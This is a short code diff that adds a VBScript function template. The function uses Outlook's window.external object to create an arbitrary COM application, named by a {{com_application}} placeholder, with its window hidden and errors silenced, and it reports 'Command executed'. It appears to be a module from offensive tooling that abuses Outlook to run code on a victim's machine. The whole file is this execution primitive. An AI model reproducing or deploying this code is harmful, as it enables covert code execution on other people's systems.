@@ -1,0 +1,6 @@
+Function Execute_Application()
+    On Error Resume Next
+	Set app = window.external.OutlookApplication.CreateObject({{com_application}})
+    app.Visible = false
+    Execute_Application = "Command executed: OutlookApplication.CreateObject(" & {{com_application}} & ")"
+End Function
